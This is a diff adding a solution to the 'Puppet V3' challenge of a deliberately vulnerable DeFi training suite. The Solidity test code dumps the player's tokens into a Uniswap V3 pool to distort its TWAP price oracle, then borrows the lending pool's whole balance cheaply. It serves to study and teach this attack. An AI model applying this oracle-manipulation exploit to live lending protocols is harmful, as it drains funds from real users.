@@ -10,6 +10,8 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {PuppetV3Attacker} from "./PuppetV3Attacker.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -119,7 +121,23 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
+        address token0 = address(weth) < address(token) ? address(weth) : address(token);
+        address token1 = address(weth) < address(token) ? address(token) : address(weth);
+
+        // 1. Wrap ETH and swap all player DVT -> WETH on Uniswap V3
+        weth.deposit{value: address(player).balance}();
+        PuppetV3Attacker attacker = new PuppetV3Attacker(uniswapPool, IERC20(token0), IERC20(token1));
+        token.approve(address(attacker), type(uint256).max);
+        attacker.swapExact(player, IERC20(address(token)), PLAYER_INITIAL_TOKEN_BALANCE);
+
+        // 2. Let TWAP window include the manipulated tick, then borrow all DVT
+        skip(70); // 70 seconds at least.
+        weth.approve(address(lendingPool), type(uint256).max);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        // 3. Send stolen DVT to recovery
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
